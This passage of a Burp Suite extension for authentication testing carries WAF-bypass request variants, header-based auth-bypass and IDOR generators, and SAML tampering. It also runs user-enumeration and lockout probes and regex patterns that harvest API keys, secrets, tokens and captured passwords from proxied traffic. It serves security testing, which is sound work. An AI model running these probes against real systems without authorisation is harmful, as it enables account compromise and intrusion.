        segs[-1] = segs[-1].replace('%', '%25')
        p4 = '/'.join(segs)
        variants.append(("path-double-encoded", method, p4, host, dict(headers or {}), body))

    h5 = dict(headers or {})
    h5['Content-Type'] = 'application/x-www-form-urlencoded;charset=UTF-8;boundary=x'
    variants.append(("content-type-juggled", method, path, host, h5, body))

    return variants


# ---------------------------------------------------------------------------
# Swing Thread-Safe Field Updater Runner
# ---------------------------------------------------------------------------

class FieldUpdater(Runnable):
    def __init__(self, text_field, value):
        self.text_field = text_field
        self.value = value

    def run(self):
        try:
            if self.text_field and self.value:
                self.text_field.setText(str(self.value))
        except Exception as e:
            print("Field update error: %s" % e)


# ---------------------------------------------------------------------------
# Main Burp Extension Class
# ---------------------------------------------------------------------------

class BurpExtender(IBurpExtender, ITab, IHttpListener, IContextMenuFactory):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Auth/SSO/OAuth/SAML/WSTG Tester")

        self.captured_saml_xml = None
        self.captured_saml_redirect_binding = False
        self.results_rows = []
        self.manual_rows = []

        self._build_ui()
        callbacks.addSuiteTab(self)
        callbacks.registerHttpListener(self)
        callbacks.registerContextMenuFactory(self)
        print("Auth/SSO/OAuth/SAML/WSTG Tester loaded with Auto-Population enabled.")

    def _update_field(self, field, val):
        if field and val:
            SwingUtilities.invokeLater(FieldUpdater(field, val))

    # ---------------- UI ----------------

    def _build_ui(self):
        self.main_panel = JPanel(BorderLayout())
        tabs = JTabbedPane()

        tabs.addTab("Target / Login", self._build_login_panel())
        tabs.addTab("Microsoft SSO / ADFS", self._build_ms_panel())
        tabs.addTab("OAuth / OIDC (generic)", self._build_oauth_panel())
        tabs.addTab("SAML", self._build_saml_panel())
        tabs.addTab("WSTG Auth & AuthZ", self._build_wstg_panel())
        tabs.addTab("WAF Bypass", self._build_waf_panel())
        tabs.addTab("Results", self._build_results_panel())
        tabs.addTab("Manual Review Queue", self._build_manual_panel())

        self.main_panel.add(tabs, BorderLayout.CENTER)

    def _labeled_field(self, panel, label, default=""):
        panel.add(JLabel(label))
        f = JTextField(default)
        panel.add(f)
        return f

    def _build_login_panel(self):
        top = JPanel(GridLayout(0, 2, 5, 5))
        self.f_login_url = self._labeled_field(top, "Login POST URL:", "")
        self.f_email = self._labeled_field(top, "Email:", "")
        self.f_pass_field = JPasswordField("")
        top.add(JLabel("Password:")); top.add(self.f_pass_field)
        self.f_otp = self._labeled_field(top, "OTP (leave blank if not required):", "")
        self.f_email_param = self._labeled_field(top, "Email param name:", "username")
        self.f_pass_param = self._labeled_field(top, "Password param name:", "password")
        self.f_otp_param = self._labeled_field(top, "OTP param name:", "otp")
        self.f_body_extra = self._labeled_field(top, "Extra static body params (a=1&b=2):", "")

        self.cb_lockout = JCheckBox("Enable lockout probe (mutates lockout state -- OFF by default)")
        self.f_lockout_attempts = self._labeled_field(top, "Lockout probe: max wrong-password attempts:", "4")
        self.cb_enum = JCheckBox("Enable user-enumeration probe (valid vs invalid email diffing)", True)
        self.cb_forgot = JCheckBox("Enable forgot-password probe", True)
        self.f_forgot_url = self._labeled_field(top, "Forgot-password POST URL:", "")
        self.f_forgot_param = self._labeled_field(top, "Forgot-password email param:", "username")

        opts = JPanel(GridLayout(0, 1))
        opts.add(self.cb_enum)
        opts.add(self.cb_forgot)
        opts.add(self.cb_lockout)

        run_btn = JButton("Run login + session + password module", actionPerformed=self.run_login_suite)
        report_btn = JButton("Export report (Markdown)", actionPerformed=self.export_report)

        wrapper = JPanel()
        wrapper.setLayout(BoxLayout(wrapper, BoxLayout.Y_AXIS))
        wrapper.add(top)
        wrapper.add(opts)
        wrapper.add(run_btn)
        wrapper.add(report_btn)
        return wrapper

    def _build_ms_panel(self):
        top = JPanel(GridLayout(0, 2, 5, 5))
        self.f_ms_tenant = self._labeled_field(top, "Tenant (GUID / verified domain):", "")
        self.f_ms_client_id = self._labeled_field(top, "client_id (App registration):", "")
        self.f_ms_redirect = self._labeled_field(top, "redirect_uri:", "")
        self.f_ms_scope = self._labeled_field(top, "scope:", "")
        ms_btn = JButton("Generate Entra ID (Azure AD) variants -> Repeater", actionPerformed=self.run_ms_oauth_variants)

        adfs_label = JLabel("--- Internal SSO: ADFS / WS-Federation ---")
        self.f_adfs_base = self._labeled_field(top, "ADFS base URL:", "")
        self.f_adfs_wtrealm = self._labeled_field(top, "wtrealm (RP identifier):", "")
        self.f_adfs_wreply = self._labeled_field(top, "wreply:", "")
        adfs_btn = JButton("Generate ADFS/WS-Fed variants -> Repeater", actionPerformed=self.run_wsfed_variants)

        note = JTextArea("Covers external SSO through Entra ID and internal SSO through ADFS/WS-Federation.")
        note.setEditable(False)
        wrapper = JPanel()
        wrapper.setLayout(BoxLayout(wrapper, BoxLayout.Y_AXIS))
        wrapper.add(top)
        wrapper.add(ms_btn)
        wrapper.add(adfs_label)
        wrapper.add(adfs_btn)
        wrapper.add(note)
        return wrapper

    def _build_oauth_panel(self):
        top = JPanel(GridLayout(0, 2, 5, 5))
        self.f_oauth_authorize = self._labeled_field(top, "Authorization endpoint URL:", "")
        self.f_oauth_redirect = self._labeled_field(top, "Registered redirect_uri:", "")
        self.f_oauth_client_id = self._labeled_field(top, "client_id:", "")
        self.f_oauth_scope = self._labeled_field(top, "scope:", "")

        gen_btn = JButton("Generate OAuth/OIDC variants -> Repeater", actionPerformed=self.run_oauth_variants)
        note = JTextArea("Each variant is queued into a labeled Repeater tab for manual validation.")
        note.setEditable(False)
        wrapper = JPanel()
        wrapper.setLayout(BoxLayout(wrapper, BoxLayout.Y_AXIS))
        wrapper.add(top)
        wrapper.add(gen_btn)
        wrapper.add(note)
        return wrapper

    def _build_saml_panel(self):
        top = JPanel(BorderLayout())
        info = JLabel("Interception/Proxy automatically captures and populates SAMLResponse/SAMLRequest here.")
        self.cb_redirect_binding = JCheckBox("Value is HTTP-Redirect bound (raw DEFLATE, not just base64)")
        self.saml_preview = JTextArea(12, 60)
        self.saml_preview.setFont(Font("Monospaced", Font.PLAIN, 11))
        gen_btn = JButton("Generate SAML tamper variants -> Repeater", actionPerformed=self.run_saml_variants)

        north = JPanel()
        north.setLayout(BoxLayout(north, BoxLayout.Y_AXIS))
        north.add(info)
        north.add(self.cb_redirect_binding)
        north.add(gen_btn)

        top.add(north, BorderLayout.NORTH)
        top.add(JScrollPane(self.saml_preview), BorderLayout.CENTER)
        return top

    def _build_wstg_panel(self):
        top = JPanel(GridLayout(0, 2, 5, 5))
        self.f_wstg_change_pass_url = self._labeled_field(top, "Password Change POST URL:", "https://host/api/user/change-password")
        self.f_wstg_pass_input = self._labeled_field(top, "Test Password for Policy Check:", "P@ss1")
        self.f_wstg_target_url = self._labeled_field(top, "Target Auth/AuthZ Endpoint:", "https://host/api/user/profile?user_id=101")

        btn_pass_policy = JButton("Check Password Policy (WSTG-ATHN-07)", actionPerformed=self.run_wstg_password_checks)
        btn_auth_bypass = JButton("Generate Auth Bypass Headers -> Repeater (WSTG-ATHN-04)", actionPerformed=self.run_wstg_auth_bypass)
        btn_authz_idor = JButton("Generate AuthZ / IDOR / PrivEsc Variants -> Repeater (WSTG-ATHZ)", actionPerformed=self.run_wstg_authz)

        info = JTextArea(
            "WSTG (OWASP Web Security Testing Guide) Module:\n"
            "- WSTG-ATHN-01: Encrypted Channel (HTTP vs HTTPS)\n"
            "- WSTG-ATHN-04: Bypassing Auth via Headers (X-Forwarded-User, X-Remote-User)\n"
            "- WSTG-ATHN-06: Browser Cache Weaknesses (Cache-Control: no-store)\n"
            "- WSTG-ATHN-07: Weak Password Policy\n"
            "- WSTG-ATHN-08: Password Change/Reset Weaknesses\n"
            "- WSTG-ATHZ-02/03/04: Bypassing AuthZ Schema, Privilege Escalation, IDOR Probes")
        info.setEditable(False)
        info.setLineWrap(True)
        info.setWrapStyleWord(True)

        wrapper = JPanel()
        wrapper.setLayout(BoxLayout(wrapper, BoxLayout.Y_AXIS))
        wrapper.add(top)
        wrapper.add(btn_pass_policy)
        wrapper.add(btn_auth_bypass)
        wrapper.add(btn_authz_idor)
        wrapper.add(info)
        return wrapper

    def _build_waf_panel(self):
        top = JPanel(BorderLayout())
        info = JLabel("Intercepted 403/406/429 blocked requests are automatically stored here.")
        run_btn = JButton("Send WAF-bypass variants and report status codes", actionPerformed=self.run_waf_variants)
        north = JPanel()
        north.setLayout(BoxLayout(north, BoxLayout.Y_AXIS))
        north.add(info)
        north.add(run_btn)
        top.add(north, BorderLayout.NORTH)
        self.waf_output = JTextArea(15, 60)
        self.waf_output.setEditable(False)
        top.add(JScrollPane(self.waf_output), BorderLayout.CENTER)
        return top

    def _build_results_panel(self):
        self.results_model = DefaultTableModel(["Module", "Severity", "Finding"], 0)
        table = JTable(self.results_model)
        return JScrollPane(table)

    def _build_manual_panel(self):
        self.manual_model = DefaultTableModel(["Module", "Item", "Why it needs a human"], 0)
        table = JTable(self.manual_model)
        return JScrollPane(table)

    def getTabCaption(self):
        return "Auth/SSO/WSTG Tester"

    def getUiComponent(self):
        return self.main_panel

    def log(self, module, severity, finding):
        try:
            self.results_model.addRow([module, severity, finding])
            self.results_rows.append({"module": module, "severity": severity, "finding": finding})
        except Exception as e:
            print("Error logging finding: %s" % e)

    def queue_manual(self, module, item, reason):
        try:
            self.manual_model.addRow([module, item, reason])
            self.manual_rows.append({"module": module, "item": item, "reason": reason})
        except Exception as e:
            print("Error logging manual item: %s" % e)

    # ---------------- Context menu ----------------

    def createMenuItems(self, invocation):
        menu = ArrayList()
        selected = invocation.getSelectedMessages()
        if not selected:
            return menu

        def capture_saml(evt):
            try:
                msg = selected[0]
                req = msg.getRequest()
                info = self._helpers.analyzeRequest(msg)
                body = self._helpers.bytesToString(req)[info.getBodyOffset():]
                url = str(info.getUrl())
                xml = None
                for pname in ('SAMLResponse', 'SAMLRequest'):
                    m = re.search(pname + r'=([^&\s]+)', body) or re.search(pname + r'=([^&\s]+)', url)
                    if m:
                        raw = self._helpers.urlDecode(m.group(1))
                        try:
                            xml = saml_decode(raw, self.cb_redirect_binding.isSelected())
                        except Exception:
                            try:
                                xml = saml_decode(raw, True)
                            except Exception as e:
                                JOptionPane.showMessageDialog(self.main_panel, "Could not decode SAML: %s" % e)
                                return
                        break
                if xml is None:
                    JOptionPane.showMessageDialog(self.main_panel, "No SAMLResponse/SAMLRequest parameter found.")
                    return
                self.captured_saml_xml = xml
                self._update_field(self.saml_preview, xml)
            except Exception as e:
                print("Error capturing SAML: %s" % e)

        def capture_waf(evt):
            try:
                self.waf_capture_msg = selected[0]
                self._update_field(self.waf_output, "Captured request to %s -- click 'Run' to send bypass variants.\n" % str(self._helpers.analyzeRequest(selected[0]).getUrl()))
            except Exception as e:
                print("Error capturing WAF request: %s" % e)

        def capture_wstg(evt):
            try:
                self.wstg_capture_msg = selected[0]
                info = self._helpers.analyzeRequest(selected[0])
                url = str(info.getUrl())
                self._update_field(self.f_wstg_target_url, url)
                JOptionPane.showMessageDialog(self.main_panel, "Captured request for WSTG AuthZ/IDOR: %s" % url)
            except Exception as e:
                print("Error capturing WSTG request: %s" % e)

        menu.add(JMenuItem("Send to Auth/SSO Tester > Capture SAML", actionPerformed=capture_saml))
        menu.add(JMenuItem("Send to Auth/SSO Tester > Capture for WAF bypass", actionPerformed=capture_waf))
        menu.add(JMenuItem("Send to Auth/SSO Tester > Capture for WSTG AuthZ / IDOR Analysis", actionPerformed=capture_wstg))
        return menu

    # ---------------- Automatic Proxy Traffic Parser & Field Auto-Populator ----------------

    SECRET_PATTERNS = [
        (r'client_id["\']?\s*[:=]\s*["\']([a-zA-Z0-9\-]{8,})', "client_id in JS"),
        (r'(authority|tenant)["\']?\s*[:=]\s*["\']([^"\']+)', "SSO authority/tenant in JS"),
        (r'redirect_uri["\']?\s*[:=]\s*["\']([^"\']+)', "redirect_uri in JS"),
        (r'(api[_-]?key|apikey)["\']?\s*[:=]\s*["\']([a-zA-Z0-9\-_]{10,})', "possible API key in JS"),
        (r'(secret|client_secret)["\']?\s*[:=]\s*["\']([a-zA-Z0-9\-_]{8,})', "possible secret in JS"),
        (r'Bearer\s+[a-zA-Z0-9\-_\.]{20,}', "hardcoded Bearer token in JS"),
        (r'(/api/[a-zA-Z0-9_\-/]+)', "API endpoint path referenced in JS"),
        (r'(TODO|FIXME|HACK)[:\s].{0,80}', "dev comment in JS"),
    ]

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        try:
            req_info = self._helpers.analyzeRequest(messageInfo)
            url = str(req_info.getUrl())
            method = req_info.getMethod()
            req_bytes = messageInfo.getRequest()
            req_text = self._helpers.bytesToString(req_bytes) if req_bytes else ""
            req_body = req_text[req_info.getBodyOffset():] if req_text else ""
            query_str = req_info.getUrl().getQuery() or ""

            params = parse_query_or_body(query_str)
            body_params = parse_query_or_body(req_body)
            all_params = dict(params)
            all_params.update(body_params)

            # --- AUTO-POPULATE 1: Target / Login Tab ---
            if method == 'POST' and any(k in url.lower() for k in ['login', 'signin', 'auth', 'authenticate', 'token']):
                self._update_field(self.f_login_url, url)
                for pk, pv in all_params.items():
                    pk_l = pk.lower()
                    if any(u in pk_l for u in ['user', 'email', 'login', 'name', 'account']):
                        self._update_field(self.f_email_param, pk)
                        if '@' in pv or len(pv) > 3:
                            self._update_field(self.f_email, pv)
                    elif any(p in pk_l for p in ['pass', 'pwd', 'secret']):
                        self._update_field(self.f_pass_param, pk)
                        if pv:
                            self._update_field(self.f_pass_field, pv)
                    elif any(o in pk_l for o in ['otp', 'mfa', 'code', 'token', '2fa']):
                        self._update_field(self.f_otp_param, pk)
                        if pv:
                            self._update_field(self.f_otp, pv)

            if method == 'POST' and any(k in url.lower() for k in ['forgot', 'reset', 'recovery']):
                self._update_field(self.f_forgot_url, url)
                for pk, pv in all_params.items():
                    if any(u in pk.lower() for u in ['user', 'email', 'account']):
                        self._update_field(self.f_forgot_param, pk)

            # --- AUTO-POPULATE 2: OAuth 2.0 / OIDC (Generic) & Microsoft Entra ID ---
            if 'client_id' in all_params or 'redirect_uri' in all_params or 'response_type' in all_params:
                client_id = all_params.get('client_id', '')
                redirect_uri = self._helpers.urlDecode(all_params.get('redirect_uri', ''))
                scope = self._helpers.urlDecode(all_params.get('scope', ''))

                if client_id:
                    self._update_field(self.f_oauth_client_id, client_id)
                    self._update_field(self.f_ms_client_id, client_id)
                if redirect_uri:
                    self._update_field(self.f_oauth_redirect, redirect_uri)
                    self._update_field(self.f_ms_redirect, redirect_uri)
                if scope:
                    self._update_field(self.f_oauth_scope, scope)
                    self._update_field(self.f_ms_scope, scope)
                if 'authorize' in url.lower() or 'auth' in url.lower():
                    self._update_field(self.f_oauth_authorize, url.split('?')[0])

                if 'login.microsoftonline.com' in url or 'sts.windows.net' in url:
                    m_tenant = re.search(r'login\.microsoftonline\.com/([^/]+)', url)
                    if m_tenant:
                        tenant_val = m_tenant.group(1)
                        self._update_field(self.f_ms_tenant, tenant_val)

            # --- AUTO-POPULATE 3: ADFS / WS-Federation ---
            if 'wtrealm' in all_params or 'wreply' in all_params or '/adfs/ls/' in url.lower():
                wtrealm = self._helpers.urlDecode(all_params.get('wtrealm', ''))
                wreply = self._helpers.urlDecode(all_params.get('wreply', ''))
                if wtrealm:
                    self._update_field(self.f_adfs_wtrealm, wtrealm)
                if wreply:
                    self._update_field(self.f_adfs_wreply, wreply)
                m_adfs = re.search(r'^(https?://[^/]+)', url)
                if m_adfs:
                    self._update_field(self.f_adfs_base, m_adfs.group(1))

            # --- AUTO-POPULATE 4: SAML 2.0 + PASSIVE CHECKS ---
            saml_val = all_params.get('SAMLResponse') or all_params.get('SAMLRequest')
            if saml_val:
                raw = self._helpers.urlDecode(saml_val)
                try:
                    xml_decoded = saml_decode(raw, self.cb_redirect_binding.isSelected())
                except Exception:
                    try:
                        xml_decoded = saml_decode(raw, True)
                    except Exception:
                        xml_decoded = None
                if xml_decoded:
                    self.captured_saml_xml = xml_decoded
                    self._update_field(self.saml_preview, xml_decoded)
                    for sev, note in analyze_saml_xml(xml_decoded):
                        self.log("SAML-Passive", sev, "%s (@ %s)" % (note, url))

            # --- AUTO-POPULATE 5: WSTG AuthZ & Password Change ---
            if method == 'POST' and any(k in url.lower() for k in ['change-password', 'update-password', 'reset-password']):
                self._update_field(self.f_wstg_change_pass_url, url)
            if any(k in url.lower() for k in ['user', 'profile', 'account', 'id=', 'role']):
                self._update_field(self.f_wstg_target_url, url)

            # --- AUTO-POPULATE 6: WAF Bypass on Blocked Responses ---
            if not messageIsRequest:
                resp = messageInfo.getResponse()
                if resp:
                    resp_info = self._helpers.analyzeResponse(resp)
                    status = resp_info.getStatusCode()
                    if status in [403, 406, 429]:
                        self.waf_capture_msg = messageInfo
                        self._update_field(self.waf_output, "Auto-captured HTTP %d blocked request to %s\nClick 'Send WAF-bypass variants' to run." % (status, url))

            # --- ADVANCED PASSIVE SSO CHECKS (requests) ---
            try:
                for sev, note in check_oauth_request(url, all_params):
                    self.log("OAuth-Passive", sev, "%s (@ %s)" % (note, url))
            except Exception as e:
                print("OAuth passive check error: %s" % e)

            try:
                tokens = []
                for hdr in req_info.getHeaders()[1:]:
                    if hdr.lower().startswith('authorization:'):
                        tokens.extend(find_jwts(hdr.split(':', 1)[1]))
                for tok in list(set(tokens))[:8]:
                    for sev, note in analyze_ms_token(tok):
                        self.log("MS-Token-Passive", sev, "%s (@ %s)" % (note, url))
            except Exception as e:
                print("Token passive check error: %s" % e)


            # --- PASSIVE RECON & WSTG HEADERS ---
            if not messageIsRequest:
                resp = messageInfo.getResponse()
                if resp:
                    resp_info = self._helpers.analyzeResponse(resp)
                    headers_text = "\n".join(list(resp_info.getHeaders()))
                    wstg_findings = check_wstg_auth_headers(url, resp_info.getStatusCode(), headers_text)
                    for sev, note in wstg_findings:
                        self.log("WSTG-Passive", sev, "%s (@ %s)" % (note, url))

                    if any(k in url.lower() for k in ('login', 'auth', 'oauth', 'saml', 'token', 'session', 'account', 'profile', 'admin')):
                        for sev, note in check_sso_session_headers(headers_text, headers_text):
                            self.log("SSO-Session-Passive", sev, "%s (@ %s)" % (note, url))

                    for tok in find_jwts(self._helpers.bytesToString(resp)[resp_info.getBodyOffset():]):
                        for sev, note in analyze_ms_token(tok):
                            self.log("MS-Token-Passive", sev, "%s (@ %s)" % (note, url))

                    mime = resp_info.getStatedMimeType().lower()
                    if 'script' in mime or url.endswith('.js'):
                        body = self._helpers.bytesToString(resp)[resp_info.getBodyOffset():]
                        if len(body) > 400000:
                            body = body[:400000]
                        for pattern, label in self.SECRET_PATTERNS:
                            for m in re.finditer(pattern, body):
                                snippet = m.group(0)[:120]
                                self.log("JS-recon", "info", "%s @ %s -> %s" % (label, url, snippet))
        except Exception as e:
            print("Auto-population proxy error: %s" % e)

    # ---------------- Login / Session / Password Module ----------------

    def _send(self, protocol, host, port, raw_request):
        try:
            service = SimpleHttpService(host, port, protocol)
            req_bytes = self._helpers.stringToBytes(raw_request)
            result = self._callbacks.makeHttpRequest(service, req_bytes)
            resp_bytes = result.getResponse()
            if resp_bytes is None:
                return None, ""
            info = self._helpers.analyzeResponse(resp_bytes)
            body = self._helpers.bytesToString(resp_bytes)[info.getBodyOffset():]
            headers = list(info.getHeaders())
            return info.getStatusCode(), "\n".join(headers) + "\n\n" + body
        except Exception as e:
            print("HTTP send error: %s" % e)
            return None, ""

    def run_login_suite(self, evt):
        try:
            protocol, host, port, path = parse_url(self.f_login_url.text)
        except Exception as e:
            JOptionPane.showMessageDialog(self.main_panel, str(e))
            return

        email = self.f_email.text
        password = ''.join(self.f_pass_field.getPassword())
        otp = self.f_otp.text
        extra = self.f_body_extra.text

        for sev, note in check_wstg_password_policy(password):
            self.log("WSTG-ATHN-07", sev, note)

        body_parts = ["%s=%s" % (self.f_email_param.text, email),
                      "%s=%s" % (self.f_pass_param.text, password)]
        if otp:
            body_parts.append("%s=%s" % (self.f_otp_param.text, otp))
        if extra:
            body_parts.append(extra)
        body = "&".join(body_parts)
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        raw = build_raw_request("POST", path, host, headers, body)

        status, resp_text = self._send(protocol, host, port, raw)
        self.log("Login", "info", "Login attempt returned HTTP %s" % status)

        self._analyze_session(resp_text)

        for tok in find_jwts(resp_text):
            for sev, note in analyze_jwt(tok):
                self.log("JWT", sev, note)

        if self.cb_enum.isSelected():
            self._enum_probe(protocol, host, port, path, headers, extra)

        if self.cb_forgot.isSelected():
            self._forgot_password_probe(email)

        if self.cb_lockout.isSelected():
            self._lockout_probe(protocol, host, port, path, headers, email, extra)

    def _analyze_session(self, resp_text):
        if not resp_text:
            return
        set_cookies = re.findall(r'(?im)^Set-Cookie:\s*(.+)$', resp_text)
        for sc in set_cookies:
            name = sc.split('=')[0].strip()
            flags = sc.lower()
            missing = []
            if 'secure' not in flags:
                missing.append('Secure')
            if 'httponly' not in flags:
                missing.append('HttpOnly')
            if 'samesite' not in flags:
                missing.append('SameSite')
            if missing:
                self.log("Session", "medium", "Cookie '%s' missing flags: %s" % (name, ", ".join(missing)))
            else:
                self.log("Session", "info", "Cookie '%s' has Secure/HttpOnly/SameSite flags." % name)

    def _enum_probe(self, protocol, host, port, path, headers, extra):
        valid_body = "%s=%s&%s=wrong-pw-%s" % (
            self.f_email_param.text, self.f_email.text, self.f_pass_param.text, rand_str())
        invalid_body = "%s=nonexistent-%s@example.com&%s=wrong-pw-%s" % (
            self.f_email_param.text, rand_str(), self.f_pass_param.text, rand_str())
        if extra:
            valid_body += "&" + extra
            invalid_body += "&" + extra

        raw1 = build_raw_request("POST", path, host, headers, valid_body)
        raw2 = build_raw_request("POST", path, host, headers, invalid_body)
        t0 = time.time(); s1, r1 = self._send(protocol, host, port, raw1); d1 = time.time() - t0
        t0 = time.time(); s2, r2 = self._send(protocol, host, port, raw2); d2 = time.time() - t0

        if s1 != s2:
            self.log("UserEnum", "medium", "Status differs for valid (%s) vs unknown (%s) email -> enumeration." % (s1, s2))
        elif abs(len(r1) - len(r2)) > 20:
            self.log("UserEnum", "medium", "Response length differs (%d vs %d bytes) -> enumeration." % (len(r1), len(r2)))
        elif abs(d1 - d2) > 0.5:
            self.log("UserEnum", "low", "Timing differs (%.2fs vs %.2fs) -> timing enumeration." % (d1, d2))
        else:
            self.log("UserEnum", "info", "No obvious enumeration signal on login endpoint.")

    def _forgot_password_probe(self, email):
        try:
            protocol, host, port, path = parse_url(self.f_forgot_url.text)
        except Exception as e:
            self.log("ForgotPassword", "info", "Skipped (bad URL: %s)" % e)
            return
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        body = "%s=%s" % (self.f_forgot_param.text, email)
        raw = build_raw_request("POST", path, host, headers, body)
        status, resp_text = self._send(protocol, host, port, raw)
        self.log("ForgotPassword", "info", "Forgot-password request returned HTTP %s" % status)

        if re.search(r'(reset[_-]?token|token=)[a-zA-Z0-9\-_.]{10,}', resp_text, re.I):
            self.log("ForgotPassword", "critical", "Reset token disclosed directly in response body!")
            self.queue_manual("ForgotPassword", self.f_forgot_url.text, "Confirm reset token reuse & lifetime manually.")

        unknown_body = "%s=nonexistent-%s@example.com" % (self.f_forgot_param.text, rand_str())
        raw2 = build_raw_request("POST", path, host, headers, unknown_body)
        status2, resp_text2 = self._send(protocol, host, port, raw2)
        if status != status2 or abs(len(resp_text) - len(resp_text2)) > 20:
            self.log("ForgotPassword", "medium", "Forgot-password response differs for known vs unknown email.")

    def _lockout_probe(self, protocol, host, port, path, headers, email, extra):
        try:
            max_attempts = int(self.f_lockout_attempts.text)
        except Exception:
            max_attempts = 4
        statuses = []
        for i in range(max_attempts):
            body = "%s=%s&%s=wrong-%s" % (self.f_email_param.text, email, self.f_pass_param.text, rand_str())
            if extra:
                body += "&" + extra
            raw = build_raw_request("POST", path, host, headers, body)
            status, _ = self._send(protocol, host, port, raw)
            statuses.append(status)
            time.sleep(1)
        self.log("Lockout", "info", "Status codes across %d failed attempts: %s" % (max_attempts, statuses))
        if len(set(statuses)) == 1:
            self.log("Lockout", "medium", "No status change across %d failed attempts -- verify lockout/CAPTCHA." % max_attempts)

    # ---------------- Module Handlers ----------------

    def run_oauth_variants(self, evt):
        try:
            authorize_url = self.f_oauth_authorize.text
            redirect_uri = self.f_oauth_redirect.text
            client_id = self.f_oauth_client_id.text
            scope = self.f_oauth_scope.text
            variants = gen_oauth_variants(authorize_url, redirect_uri, client_id, scope, {})
            for name, desc, protocol, host, port, path, query, expectation in variants:
                raw = build_raw_request("GET", path, host, {}, None, extra_query=query)
                self._callbacks.sendToRepeater(host, port, protocol == 'https', self._helpers.stringToBytes(raw), "OAuth: %s" % name)
                self.log("OAuth", "info", "%s -> queued to Repeater. %s" % (name, expectation))
                self.queue_manual("OAuth", name, desc + " | " + expectation)
        except Exception as e:
            JOptionPane.showMessageDialog(self.main_panel, "Error running OAuth variants: %s" % e)

    def run_ms_oauth_variants(self, evt):
        try:
            tenant = self.f_ms_tenant.text.strip()
            client_id = self.f_ms_client_id.text.strip()
            redirect_uri = self.f_ms_redirect.text.strip()
            scope = self.f_ms_scope.text.strip()
            if not tenant or not client_id:
                JOptionPane.showMessageDialog(self.main_panel, "Tenant and client_id are required.")
                return
            variants = gen_ms_oauth_variants(tenant, client_id, redirect_uri, scope)
            for name, desc, protocol, host, port, path, query, expectation in variants:
                raw = build_raw_request("GET", path, host, {}, None, extra_query=query)
                self._callbacks.sendToRepeater(host, port, protocol == 'https', self._helpers.stringToBytes(raw), "MS-SSO: %s" % name)
                self.log("MicrosoftSSO", "info", "%s -> queued to Repeater. %s" % (name, expectation))
                self.queue_manual("MicrosoftSSO", name, desc + " | " + expectation)
        except Exception as e:
            JOptionPane.showMessageDialog(self.main_panel, "Error running Entra ID variants: %s" % e)

    def run_wsfed_variants(self, evt):
        try:
            base = self.f_adfs_base.text.strip()
            wtrealm = self.f_adfs_wtrealm.text.strip()
            wreply = self.f_adfs_wreply.text.strip()
            if not base or not wtrealm or not wreply:
                JOptionPane.showMessageDialog(self.main_panel, "ADFS base URL, wtrealm and wreply are required.")
                return
            variants = gen_wsfed_variants(base, wtrealm, wreply)
            for name, desc, protocol, host, port, path, query, expectation in variants:
                raw = build_raw_request("GET", path, host, {}, None, extra_query=query)
                self._callbacks.sendToRepeater(host, port, protocol == 'https', self._helpers.stringToBytes(raw), "ADFS: %s" % name)
                self.log("ADFS", "info", "%s -> queued to Repeater. %s" % (name, expectation))
                self.queue_manual("ADFS", name, desc + " | " + expectation)
        except Exception as e:
            JOptionPane.showMessageDialog(self.main_panel, "Error running ADFS variants: %s" % e)

    def run_saml_variants(self, evt):
        try:
            xml_text = self.saml_preview.getText() or self.captured_saml_xml
            if not xml_text:
                JOptionPane.showMessageDialog(self.main_panel, "No SAML XML captured yet. Capture SAML first.")
                return
            redirect_binding = self.cb_redirect_binding.isSelected()
            variants = gen_saml_variants(xml_text)
            if not variants:
                self.log("SAML", "info", "No SAML variants generated -- XML shape not recognized.")
                return
            for name, desc, mutated_xml, expectation in variants:
                encoded = saml_encode(mutated_xml, redirect_binding)
                self.log("SAML", "info", "Variant '%s' generated (%d bytes encoded). %s" % (name, len(encoded), expectation))
                self.queue_manual("SAML", name, desc + " | Base64 sample:\n" + encoded[:200] + ("..." if len(encoded) > 200 else ""))
        except Exception as e:
            JOptionPane.showMessageDialog(self.main_panel, "Error running SAML variants: %s" % e)

    def run_wstg_password_checks(self, evt):
        try:
            pw = self.f_wstg_pass_input.text
            findings = check_wstg_password_policy(pw)
            for sev, note in findings:
                self.log("WSTG-ATHN-07", sev, note)
            if not findings:
                self.log("WSTG-ATHN-07", "info", "Password meets basic complexity guidelines.")

            change_url = self.f_wstg_change_pass_url.text
            if change_url:
                self.queue_manual("WSTG-ATHN-08", change_url, "Verify if password change requires current password and invalidates active sessions.")
        except Exception as e:
            print("Error running WSTG password checks: %s" % e)

    def run_wstg_auth_bypass(self, evt):
        try:
            target_url = self.f_wstg_target_url.text
            protocol, host, port, path = parse_url(target_url)
            variants = gen_wstg_auth_bypass_headers("GET", path, host, {}, None)
            for name, method, p, h, hdrs, body, expectation in variants:
                raw = build_raw_request(method, p, h, hdrs, body)
                self._callbacks.sendToRepeater(host, port, protocol == 'https', self._helpers.stringToBytes(raw), "WSTG: %s" % name)
                self.log("WSTG-ATHN-04", "info", "%s -> queued to Repeater. %s" % (name, expectation))
                self.queue_manual("WSTG-ATHN-04", name, expectation)
        except Exception as e:
            JOptionPane.showMessageDialog(self.main_panel, "Error running WSTG Auth Bypass: %s" % e)

    def run_wstg_authz(self, evt):
        try:
            msg = getattr(self, 'wstg_capture_msg', None)
            if msg:
                info = self._helpers.analyzeRequest(msg)
                req_bytes = msg.getRequest()
                req_text = self._helpers.bytesToString(req_bytes)
                method = req_text.split(' ')[0]
                path = str(info.getUrl().getPath())
                if info.getUrl().getQuery():
                    path += '?' + info.getUrl().getQuery()
                host = info.getUrl().getHost()
                port = info.getUrl().getPort() if info.getUrl().getPort() != -1 else (443 if info.getUrl().getProtocol() == 'https' else 80)
                protocol = info.getUrl().getProtocol()
                headers = {}
                for h in info.getHeaders()[1:]:
                    if ':' in h:
                        k, v = h.split(':', 1)
                        headers[k.strip()] = v.strip()
                body = req_text[info.getBodyOffset():]
            else:
                target_url = self.f_wstg_target_url.text
                protocol, host, port, path = parse_url(target_url)
                method = "GET"
                headers = {}
                body = None

            variants = gen_wstg_authz_variants(method, path, host, headers, body)
            for name, m, p, h, hdrs, b, expectation in variants:
                raw = build_raw_request(m, p, h, hdrs, b)
                self._callbacks.sendToRepeater(host, port, protocol == 'https', self._helpers.stringToBytes(raw), "WSTG-ATHZ: %s" % name)
                self.log("WSTG-ATHZ", "info", "%s -> queued to Repeater. %s" % (name, expectation))
